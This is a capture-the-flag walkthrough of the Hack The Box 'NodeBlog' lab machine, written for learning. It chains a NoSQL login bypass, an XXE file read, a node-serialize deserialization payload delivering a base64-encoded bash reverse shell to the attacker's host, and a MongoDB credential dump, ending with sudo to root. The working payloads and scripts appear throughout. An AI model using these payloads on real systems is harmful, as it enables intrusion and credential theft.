# HTB NodeBlog — Full Walkthrough
**Difficulty:** Easy | **OS:** Linux | **IP:** 10.129.96.160

---

## The Hacker Mindset

Before touching a single tool, understand the goal: **enumerate first, exploit second**.  
Every step builds on the last. You're not guessing — you're following the evidence.  
The machine will tell you how to break it, if you ask the right questions.

---

## Phase 1: Reconnaissance

### Step 1 — Full Port Scan

```bash
nmap -p- --min-rate 10000 10.129.96.160
```

**Why `-p-`?**  
By default nmap only scans the top 1000 ports. Many CTF machines (and real targets) run services on non-standard ports. `-p-` scans all 65535 ports so nothing is missed.

**Why `--min-rate 10000`?**  
Speed. On HTB the machine is yours alone, so aggressive scanning is fine. This sends at least 10,000 packets per second instead of nmap's slow default.

**Result:**
```
22/tcp   open  ssh
5000/tcp open  upnp
```

**What this tells us:**  
Two ports. SSH on 22 is standard — usually only useful once we have credentials. Port 5000 is interesting — "upnp" is nmap's best guess but it could be anything. We investigate.

---

### Step 2 — Service Version Scan

```bash
nmap -p 22,5000 -sCV 10.129.96.160
```

**Why `-sCV`?**  
- `-sC` runs default scripts (fingerprints the service, grabs banners, checks common vulnerabilities)  
- `-sV` probes for the exact version

**Result:**
```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
5000/tcp open  http    Node.js (Express middleware)
                       title: Blog
```

**What this tells us:**  
- SSH version leaks the OS: Ubuntu 20.04 Focal. Filed away for later.
- Port 5000 is a **Node.js Express web app** called "Blog". This is our primary attack surface.
- Express is a minimal Node.js web framework — common in CTFs and known for certain vulnerability patterns.

**Hacker mindset:** Technology fingerprinting tells you *what weapons to load*. Node.js + Express has a known ecosystem of vulnerabilities. You're already thinking: NoSQL injection (if MongoDB is behind it), deserialization (node-serialize), prototype pollution.

---

## Phase 2: Web Application Enumeration

### Step 3 — Browse the Site

Visiting `http://10.129.96.160:5000` shows a blog. There's a **Login** button.

**Why enumerate the login first?**  
Authentication is the gatekeeper. Bypassing it gives you more functionality to attack. It's always step one with web apps.

**What we see at `/login`:**  
A standard username/password form. We try obvious credentials: `admin/admin`, `admin/password` — they fail, but the error message is important: "Invalid Password" (not "Invalid username"). This tells us **admin is a valid username**.

**Hacker mindset:** Error messages are information leaks. "Invalid Password" vs "Invalid Username/Password" confirms account existence.

---

## Phase 3: NoSQL Injection — Authentication Bypass

### Step 4 — Identify the Backend

Express + Node.js apps very commonly use **MongoDB** as their database (the "M" in the MEAN stack). MongoDB queries are JSON-based and vulnerable to a class of attack called **NoSQL injection**.

### Step 5 — Understanding the Attack

Normal login sends this POST body:
```
user=admin&password=wrongpassword
```

The server likely runs a MongoDB query like:
```javascript
db.users.findOne({ user: "admin", password: "wrongpassword" })
```

If MongoDB receives a **JSON object** instead of a string for the password field, we can pass operators like `$ne` (not equal). The query becomes:
```javascript
db.users.findOne({ user: "admin", password: { $ne: "wrongpassword" } })
```

This finds any user named `admin` whose password is *not* "wrongpassword" — which is every valid user. **Auth bypassed.**

**But there's a catch:** The browser sends form data as `application/x-www-form-urlencoded`. To pass JSON objects, we need `Content-Type: application/json`.

### Step 6 — Execute the Bypass

```bash
curl -s -i -X POST http://10.129.96.160:5000/login \
  -H 'Content-Type: application/json' \
  -d '{"user": "admin", "password": {"$ne": "wrongpassword"}}'
```

**Breaking it down:**
- `-i` — show response headers (we need to see the cookie)
- `-X POST` — force a POST request
- `-H 'Content-Type: application/json'` — tell the server we're sending JSON
- `-d '...'` — the JSON body with our `$ne` injection

**Result:** The response contains:
```
Set-Cookie: auth=%7B%22user%22%3A%22admin%22%2C%22sign%22%3A%2223e112072945418601deb47d9a6c7de8%22%7D
```

URL-decoding that cookie gives us:
```json
{"user":"admin","sign":"23e112072945418601deb47d9a6c7de8"}
```

We're logged in as admin.

---

## Phase 4: XXE — File Read

### Step 7 — Explore the Authenticated App

Logged in, we see new features: "New Article", "Upload", "Edit", "Delete". The **Upload** button accepts files.

**Hacker mindset:** File upload = high value target. Always ask: what does the server *do* with the file? Parse it? Execute it? Store it?

Sending a random file returns:
```
Invalid XML Example: <post><title>...</title><description>...</description><markdown>...</markdown></post>
```

The server expects **XML**. XML parsers are notoriously dangerous.

### Step 8 — Understanding XXE

**XML External Entity (XXE)** is a vulnerability where an XML parser processes attacker-controlled entity definitions. You can define an entity that references a local file, and the parser substitutes the file contents into the document.

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<post>
  <markdown>&file;</markdown>
</post>
```

Here, `&file;` is replaced by the contents of `/etc/passwd` when the XML is parsed.

### Step 9 — Read the Server Source Code

We know the app is Node.js, and common source file names are `server.js`, `index.js`, `app.js`. We target `/opt/blog/server.js` (a common deployment path on Linux).

```bash
cat > /tmp/xxe.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///opt/blog/server.js">
]>
<post>
  <title>test</title>
  <description>test</description>
  <markdown>&file;</markdown>
</post>
EOF

curl -s -X POST http://10.129.96.160:5000/articles/xml \
  -H "Cookie: auth=%7B%22user%22%3A%22admin%22%2C%22sign%22%3A%2223e112072945418601deb47d9a6c7de8%22%7D" \
  -F "file=@/tmp/xxe.xml"
```

**Result:** The `markdown` textarea in the response contains the full `server.js` source. Key findings:

```javascript
const serialize = require('node-serialize')           // ← DANGER
const cookie_secret = "UHC-SecretCookie"              // ← leaked secret

function authenticated(c) {
    c = serialize.unserialize(c)                      // ← called on raw cookie!
    if (c.sign == ...) { return true }
}
```

**Why is this critical?**  
`node-serialize.unserialize()` is being called on the raw value of the `auth` cookie **before** any validation. This means whatever we put in that cookie gets deserialized. This is the vulnerability.

---

## Phase 5: Deserialization RCE — Shell

### Step 10 — Understanding node-serialize

The `node-serialize` library has a known vulnerability: if a serialized object contains a function marked with the special prefix `_$$ND_FUNC$$_`, and that function is immediately invoked (IIFE — Immediately Invoked Function Expression), it executes arbitrary code during deserialization.

**Normal serialized object:**
```json
{"user": "admin"}
```

**Malicious serialized object:**
```json
{"rce": "_$$ND_FUNC$$_function(){require('child_process').exec('id');}()"}
```

The `()` at the end of the function makes it execute immediately when unserialized.

### Step 11 — Craft the Reverse Shell Payload

A direct bash reverse shell has characters that break URL encoding. The safe approach is to base64-encode the shell command, then decode and execute it server-side.

**The reverse shell command:**
```bash
bash -i >& /dev/tcp/10.10.16.84/4444 0>&1
```

**Base64 encoded:**
```
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi44NC80NDQ0IDA+JjEK
```

**The deserialization payload:**
```json
{
  "rce": "_$$ND_FUNC$$_function(){require('child_process').exec('echo BASE64HERE|base64 -d|bash', function(error,stdout,stderr){console.log(stdout)});}()"
}
```

This entire JSON object must be **URL-encoded** for the cookie (spaces, braces, quotes are all special characters in HTTP cookies).

### Step 12 — Start the Listener

In a separate terminal:
```bash
nc -lnvp 4444
```

**Why netcat?**  
`nc` (netcat) listens on a port and prints anything that connects to it. When our reverse shell connects back, nc receives it and gives us an interactive terminal on the remote machine.

### Step 13 — Send the Payload

```bash
B64=$(echo 'bash -i >& /dev/tcp/10.10.16.84/4444 0>&1' | base64 -w0)

PAYLOAD=$(python3 -c "
import urllib.parse, json
cmd = 'echo ${B64}|base64 -d|bash'
obj = {\"rce\": \"_\$\$ND_FUNC\$\$_function(){require('child_process').exec('\" + cmd + \"', function(error,stdout,stderr){console.log(stdout)});}()\"}
print(urllib.parse.quote(json.dumps(obj)))
")

curl -s http://10.129.96.160:5000/ -H "Cookie: auth=${PAYLOAD}"
```

**What happens server-side:**  
1. Express receives the request with our malicious `auth` cookie
2. `authenticated()` is called with our cookie value
3. `serialize.unserialize(cookie)` executes — our IIFE fires
4. `child_process.exec()` runs: decode base64 → pipe to bash → reverse shell connects out

**Result:** Shell received:
```
connect to [10.10.16.84] from (UNKNOWN) [10.129.96.160] 39852
admin@nodeblog:/opt/blog$
```

We have code execution as `admin`.

---

## Phase 6: User Flag

### Step 14 — Upgrade the Shell (TTY)

The shell we received is a "dumb" shell — no tab completion, Ctrl+C kills it, passwords don't echo. We upgrade it.

```bash
script /dev/null -c bash
# Press Ctrl+Z
stty raw -echo; fg
# Type: reset
```

**Why?**  
- `script /dev/null -c bash` spawns bash under a pseudo-terminal (PTY)
- `Ctrl+Z` backgrounds it
- `stty raw -echo` sets our local terminal to raw mode (passes all keystrokes through)
- `fg` foregrounds the shell — now it's a proper interactive terminal

### Step 15 — Fix the Home Directory

```bash
chmod +x /home/admin
cd /home/admin
cat user.txt
```

**Why `chmod +x /home/admin`?**  
The directory `/home/admin` was deployed with permissions `644` (no execute bit). On Linux, the **execute bit on a directory** means "permission to enter it". Without it, even the owner can't `cd` into it or access files by path. Adding `+x` restores normal access.

**This is a misconfiguration bug specific to this machine's deployment.** Real-world lesson: directory permissions matter just as much as file permissions.

**Flag:** `61e24c[redacted]3b3b3a4c92`

---

## Phase 7: Privilege Escalation to Root

### Step 16 — Enumerate Running Services

```bash
netstat -tnlp
```

Output shows `127.0.0.1:27017` — that's **MongoDB**, listening only on localhost. It's accessible from our shell.

**Hacker mindset:** Any internal service is worth probing. Databases often hold credentials. No authentication was required here.

### Step 17 — Dump MongoDB Credentials

```bash
mongo blog --eval "db.users.find().forEach(printjson)"
```

**Breaking it down:**
- `mongo blog` — connect to the `blog` database
- `--eval "..."` — run a JavaScript expression non-interactively
- `db.users.find().forEach(printjson)` — dump all documents in the `users` collection, pretty-printed

**Result:**
```json
{
  "username": "admin",
  "password": "IppsecSaysPleaseSubscribe"
}
```

Plaintext password. Developers often store passwords in plain text in development databases and forget to hash them before deploying.

### Step 18 — Check sudo Permissions

```bash
sudo -l
```

Enter `IppsecSaysPleaseSubscribe` when prompted.

Output:
```
User admin may run the following commands on nodeblog:
    (ALL) ALL
    (ALL : ALL) ALL
```

**Admin can run ANY command as ANY user.** This is the highest possible sudo privilege — equivalent to being root already.

**Why does `su -` fail but `sudo su` works?**  
- `su -` switches to root using **root's password** (unknown to us)
- `sudo su` runs `su` **as root** (using admin's password, which we know)

### Step 19 — Get Root

```bash
sudo su
```

Enter `IppsecSaysPleaseSubscribe`.

```bash
cat /root/root.txt
```

**Flag:** `fc9b3e1[redacted]5dab9d86`

---

## Full Attack Chain Summary

```
[Port Scan] 
    → port 5000: Node.js/Express Blog
    
[NoSQL Injection] 
    → POST /login with JSON Content-Type
    → password: {"$ne": "x"} bypasses MongoDB auth
    → auth cookie obtained
    
[XXE File Read]
    → Upload XML with external entity to /articles/xml
    → Read /opt/blog/server.js
    → Discover: node-serialize called on raw cookie, cookie_secret leaked
    
[node-serialize Deserialization RCE]
    → Craft auth cookie with _$$ND_FUNC$$_ IIFE payload
    → Base64-encoded reverse shell → bypass bad char issues
    → URL-encode full payload for cookie
    → Shell as admin
    
[User Flag]
    → chmod +x /home/admin (fix broken dir permissions)
    → cat user.txt
    
[MongoDB Cred Dump]
    → mongo blog → db.users.find()
    → plaintext password: IppsecSaysPleaseSubscribe
    
[Privilege Escalation]
    → sudo -l → admin has (ALL) ALL
    → sudo su → root
    → cat /root/root.txt
```

---

## Key Lessons

| Vulnerability | Root Cause | Lesson |
|---|---|---|
| NoSQL Injection | No input type validation on login | Always sanitize and type-check inputs before DB queries |
| XXE | XML parser with external entities enabled | Disable external entities in XML parsers |
| Deserialization RCE | `unserialize()` called on untrusted user input (cookie) | Never deserialize data from untrusted sources |
| Plaintext DB Password | Dev password left in production MongoDB | Hash passwords at rest; audit DB contents before deploy |
| Overpowered sudo | `(ALL) ALL` sudo rule | Follow principle of least privilege |

---

*Pwned by: 10.10.16.84 | Machine IP: 10.129.96.160 | Date: 2026-06-10*
